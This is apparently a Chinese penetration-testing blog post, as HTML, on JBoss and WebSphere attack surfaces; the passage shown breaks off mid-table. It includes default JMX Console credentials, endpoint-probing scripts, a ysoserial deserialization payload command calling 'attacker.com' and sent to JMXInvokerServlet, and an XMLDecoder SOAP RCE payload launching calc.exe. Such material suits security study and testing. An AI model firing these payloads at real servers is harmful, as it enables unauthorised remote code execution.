@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="概述在企业级Java应用服务器中，JBoss（现WildFly）和IBM WebSphere长期占据核心地位。它们承载着金融交易、客户数据等敏感业务，因此成为攻击者的高价值目标。本文从渗透测试视角，深入分析这两款应用服务器的常见攻击面、历史高危漏洞及实战检测方法。  JBoss 安全测试1. JMX Console 弱口令JBoss的JMX Console通过&#x2F;jmx-console路径暴露MBe">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JBoss与WebSphere安全测试">
+<meta property="og:url" content="https://congliang.github.io/Framework-JBoss-WebSphere/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="概述在企业级Java应用服务器中，JBoss（现WildFly）和IBM WebSphere长期占据核心地位。它们承载着金融交易、客户数据等敏感业务，因此成为攻击者的高价值目标。本文从渗透测试视角，深入分析这两款应用服务器的常见攻击面、历史高危漏洞及实战检测方法。  JBoss 安全测试1. JMX Console 弱口令JBoss的JMX Console通过&#x2F;jmx-console路径暴露MBe">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-03-10T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.878Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="框架安全">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Framework-JBoss-WebSphere/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Framework-JBoss-WebSphere/","path":"Framework-JBoss-WebSphere/","title":"JBoss与WebSphere安全测试"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>JBoss与WebSphere安全测试 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JBoss-%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95"><span class="nav-number">2.</span> <span class="nav-text">JBoss 安全测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-JMX-Console-%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="nav-number">2.1.</span> <span class="nav-text">1. JMX Console 弱口令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Invoker-Servlet-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">2.2.</span> <span class="nav-text">2. Invoker Servlet 反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%85%B6%E4%BB%96JBoss%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="nav-number">2.3.</span> <span class="nav-text">3. 其他JBoss攻击面</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WebSphere-%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95"><span class="nav-number">3.</span> <span class="nav-text">WebSphere 安全测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88CVE-2017-10271%EF%BC%89"><span class="nav-number">3.1.</span> <span class="nav-text">1. XMLDecoder 反序列化（CVE-2017-10271）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88CVE-2015-7501%EF%BC%89"><span class="nav-number">3.2.</span> <span class="nav-text">2. Commons-Collections 反序列化（CVE-2015-7501）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-WebSphere-Admin-Console-%E6%A3%80%E6%B5%8B"><span class="nav-number">3.3.</span> <span class="nav-text">3. WebSphere Admin Console 检测</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%BC%E5%90%88%E5%AF%B9%E6%AF%94%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">综合对比分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E7%89%B9%E6%80%A7%E5%AF%B9%E6%AF%94"><span class="nav-number">4.1.</span> <span class="nav-text">安全特性对比</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84%E9%80%82%E7%94%A8%E6%80%A7%E7%9F%A9%E9%98%B5"><span class="nav-number">4.2.</span> <span class="nav-text">攻击路径适用性矩阵</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E8%84%9A%E6%9C%AC"><span class="nav-number">5.</span> <span class="nav-text">指纹识别脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="nav-number">6.</span> <span class="nav-text">版本漏洞速查表</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#JBoss%E6%BC%8F%E6%B4%9E%E6%98%A0%E5%B0%84"><span class="nav-number">6.1.</span> <span class="nav-text">JBoss漏洞映射</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WebSphere%E6%BC%8F%E6%B4%9E%E6%98%A0%E5%B0%84"><span class="nav-number">6.2.</span> <span class="nav-text">WebSphere漏洞映射</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E5%8A%A0%E5%9B%BA%E5%BB%BA%E8%AE%AE"><span class="nav-number">7.</span> <span class="nav-text">防御加固建议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#JBoss-WildFly"><span class="nav-number">7.1.</span> <span class="nav-text">JBoss&#x2F;WildFly</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WebSphere"><span class="nav-number">7.2.</span> <span class="nav-text">WebSphere</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C%E6%97%B6%E9%98%B2%E6%8A%A4%EF%BC%88RASP%E7%A4%BA%E4%BE%8B%EF%BC%89"><span class="nav-number">7.3.</span> <span class="nav-text">运行时防护（RASP示例）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E5%B1%82%E9%98%B2%E5%BE%A1"><span class="nav-number">7.4.</span> <span class="nav-text">网络层防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">8.</span> <span class="nav-text">免责声明</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Framework-JBoss-WebSphere/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="JBoss与WebSphere安全测试 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          JBoss与WebSphere安全测试
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-03-10 08:00:00" itemprop="dateCreated datePublished" datetime="2026-03-10T08:00:00+08:00">2026-03-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在企业级Java应用服务器中，JBoss（现WildFly）和IBM WebSphere长期占据核心地位。它们承载着金融交易、客户数据等敏感业务，因此成为攻击者的高价值目标。本文从渗透测试视角，深入分析这两款应用服务器的常见攻击面、历史高危漏洞及实战检测方法。</p>
+<hr>
+<h2 id="JBoss-安全测试"><a href="#JBoss-安全测试" class="headerlink" title="JBoss 安全测试"></a>JBoss 安全测试</h2><h3 id="1-JMX-Console-弱口令"><a href="#1-JMX-Console-弱口令" class="headerlink" title="1. JMX Console 弱口令"></a>1. JMX Console 弱口令</h3><p>JBoss的JMX Console通过<code>/jmx-console</code>路径暴露MBean管理接口。老版本（4.x&#x2F;5.x）默认不启用认证，任何访问者均可直接操作MBean。即使启用认证，默认凭据也常被保留：</p>
+<table>
+<thead>
+<tr>
+<th>默认用户名</th>
+<th>默认密码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>admin</td>
+<td>admin</td>
+</tr>
+</tbody></table>
+<p><strong>检测方法：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检测未授权访问</span></span><br><span class="line">curl -s -o /dev/null -w <span class="string">&quot;%&#123;http_code&#125;&quot;</span> http://target:8080/jmx-console/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 若返回200，列出所有MBean</span></span><br><span class="line">curl -s <span class="string">&quot;http://target:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.system:type=Server&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>利用方式：</strong> 通过<code>jboss.deployment:flavor=URL</code> MBean远程部署WAR包实现代码执行。可使用Metasploit的<code>auxiliary/scanner/http/jboss_vulnscan</code>模块批量扫描。</p>
+<p><strong>防御：</strong> 删除<code>/jmx-console</code>路径，使用JAAS配置细粒度权限，限制访问来源IP。</p>
+<h3 id="2-Invoker-Servlet-反序列化"><a href="#2-Invoker-Servlet-反序列化" class="headerlink" title="2. Invoker Servlet 反序列化"></a>2. Invoker Servlet 反序列化</h3><p>JBoss HTTP Invoker通过<code>/invoker/JMXInvokerServlet</code>等端点接收Java序列化对象并直接反序列化。若ClassPath中存在可利用的gadget chain（如Apache Commons-Collections），攻击者可触发远程代码执行。</p>
+<p><strong>常见Invoker路径：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/invoker/JMXInvokerServlet</span><br><span class="line">/invoker/EJBInvokerServlet</span><br><span class="line">/invoker/readonly</span><br></pre></td></tr></table></figure>
+
+<p><strong>Python检测脚本：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;http://192.168.1.100:8080&quot;</span></span><br><span class="line">invoker_paths = [</span><br><span class="line">    <span class="string">&quot;/invoker/JMXInvokerServlet&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/invoker/EJBInvokerServlet&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/invoker/readonly&quot;</span></span><br><span class="line">]</span><br><span class="line"><span class="comment"># Java序列化魔数</span></span><br><span class="line">magic = <span class="built_in">bytes</span>([<span class="number">0xac</span>, <span class="number">0xed</span>, <span class="number">0x00</span>, <span class="number">0x05</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> path <span class="keyword">in</span> invoker_paths:</span><br><span class="line">    url = target + path</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = requests.post(url, data=magic,</span><br><span class="line">            headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-java-serialized-object&quot;</span>&#125;,</span><br><span class="line">            timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> resp.status_code != <span class="number">404</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 发现端点: <span class="subst">&#123;path&#125;</span> (状态码: <span class="subst">&#123;resp.status_code&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>利用命令：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ysoserial生成payload</span></span><br><span class="line">java -jar ysoserial.jar CommonsCollections5 <span class="string">&quot;curl http://attacker.com/s&quot;</span> &gt; payload.bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送payload</span></span><br><span class="line">curl -X POST -H <span class="string">&quot;Content-Type: application/x-java-serialized-object&quot;</span> \</span><br><span class="line">  --data-binary @payload.bin http://target:8080/invoker/JMXInvokerServlet</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-其他JBoss攻击面"><a href="#3-其他JBoss攻击面" class="headerlink" title="3. 其他JBoss攻击面"></a>3. 其他JBoss攻击面</h3><table>
+<thead>
+<tr>
+<th>组件</th>
+<th>路径</th>
+<th>风险</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Web Console</td>
+<td><code>/web-console/</code></td>
+<td>信息泄露、弱口令</td>
+</tr>
+<tr>
+<td>Status Servlet</td>
+<td><code>/status?full=true</code></td>
+<td>配置信息泄露</td>
+</tr>
+<tr>
+<td>Admin Console</td>
+<td><code>/admin-console/</code></td>
+<td>弱口令、认证绕过</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="WebSphere-安全测试"><a href="#WebSphere-安全测试" class="headerlink" title="WebSphere 安全测试"></a>WebSphere 安全测试</h2><h3 id="1-XMLDecoder-反序列化（CVE-2017-10271）"><a href="#1-XMLDecoder-反序列化（CVE-2017-10271）" class="headerlink" title="1. XMLDecoder 反序列化（CVE-2017-10271）"></a>1. XMLDecoder 反序列化（CVE-2017-10271）</h3><p><strong>说明：</strong> CVE-2017-10271直接影响Oracle WebLogic Server的WLS Security组件。该漏洞利用<code>/wls-wsat/CoordinatorPortType</code>端点接收的XML SOAP请求，在<code>&lt;java&gt;</code>标签中嵌入恶意XMLDecoder指令实现RCE。WebSphere虽不受此CVE直接影响，但其SOAP Connector和Admin Console在历史上也存在类似的XML解析安全问题，本节一并对比分析。</p>
+<p><strong>WebSphere相关CVE：</strong></p>
+<table>
+<thead>
+<tr>
+<th>CVE编号</th>
+<th>影响版本</th>
+<th>漏洞类型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CVE-2015-7450</td>
+<td>WAS 7.0-8.5</td>
+<td>Java反序列化RCE</td>
+</tr>
+<tr>
+<td>CVE-2019-4279</td>
+<td>WAS 8.5-9.0</td>
+<td>IIOP反序列化</td>
+</tr>
+<tr>
+<td>CVE-2015-2017</td>
+<td>WAS 8.0-8.5</td>
+<td>XML外部实体注入（XXE）</td>
+</tr>
+</tbody></table>
+<p><strong>XMLDecoder利用示例：</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>/c<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>检测脚本：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;http://192.168.1.100:7001&quot;</span></span><br><span class="line">paths = [</span><br><span class="line">    <span class="string">&quot;/wls-wsat/CoordinatorPortType&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/wls-wsat/RegistrationPortTypeRPC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/wls-wsat/ParticipantPortType&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> path <span class="keyword">in</span> paths:</span><br><span class="line">    url = target + path</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = requests.get(url, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> resp.status_code <span class="keyword">in</span> [<span class="number">200</span>, <span class="number">500</span>]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 发现端点: <span class="subst">&#123;path&#125;</span> (<span class="subst">&#123;resp.status_code&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-Commons-Collections-反序列化（CVE-2015-7501）"><a href="#2-Commons-Collections-反序列化（CVE-2015-7501）" class="headerlink" title="2. Commons-Collections 反序列化（CVE-2015-7501）"></a>2. Commons-Collections 反序列化（CVE-2015-7501）</h3><p><strong>漏洞详情：</strong> CVE-2015-7501影响Apache Commons-Collections 3.2.2之前版本。FoxGlove Security在2015年公开了利用<code>InvokerTransformer</code>和<code>ChainedTransformer</code>构造gadget chain的技术，引发了Java反序列化安全地震。</p>
+<p><strong>Gadget Chain核心流程：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  └── AnnotationInvocationHandler.readObject()</span><br><span class="line">       └── LazyMap.get()</span><br><span class="line">            └── ChainedTransformer.transform()</span><br><span class="line">                 ├── ConstantTransformer → Runtime.class</span><br><span class="line">                 ├── InvokerTransformer → getMethod(&quot;getRuntime&quot;)</span><br><span class="line">                 ├── InvokerTransformer → invoke(null)</span><br><span class="line">                 └── InvokerTransformer → exec(&quot;command&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>JBoss与WebSphere对比：</strong></p>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>JBoss</th>
+<th>WebSphere</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>默认引入CC库</td>
+<td>是（4.x&#x2F;5.x&#x2F;6.x）</td>
+<td>是（部分版本）</td>
+</tr>
+<tr>
+<td>Invoker入口</td>
+<td>HTTP Invoker Servlet</td>
+<td>IIOP&#x2F;CORBA</td>
+</tr>
+<tr>
+<td>利用难度</td>
+<td>较低（HTTP直传）</td>
+<td>中等（IIOP协议）</td>
+</tr>
+<tr>
+<td>常见gadget</td>
+<td>CommonsCollections5&#x2F;6</td>
+<td>CommonsCollections2&#x2F;4</td>
+</tr>
+<tr>
